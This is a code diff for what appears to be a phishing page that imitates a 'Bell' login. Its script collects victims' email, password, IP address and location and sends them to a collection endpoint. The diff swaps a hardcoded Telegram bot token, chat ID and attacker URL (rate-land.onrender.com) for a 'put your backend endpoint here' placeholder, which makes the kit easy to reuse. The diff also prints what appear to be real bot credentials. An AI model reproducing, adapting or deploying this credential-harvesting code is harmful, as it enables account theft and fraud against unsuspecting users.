@@ -1,4 +1,5 @@
 <script>
+  let BACKEND_URL = ''; // put your backend endpoint here
   let name = 'bell';
   let email = '';
   let password = '';
@@ -95,13 +96,11 @@
 
   // Send data to Telegram
   async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
- // const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
-    // const chatId= '1613277499';
 
     // const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
     // const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const url = 'https://rate-land.onrender.com/submit';
+    const url = `{BACKEND_URL}/submit`;
 
     try {
       const response = await fetch(url, {
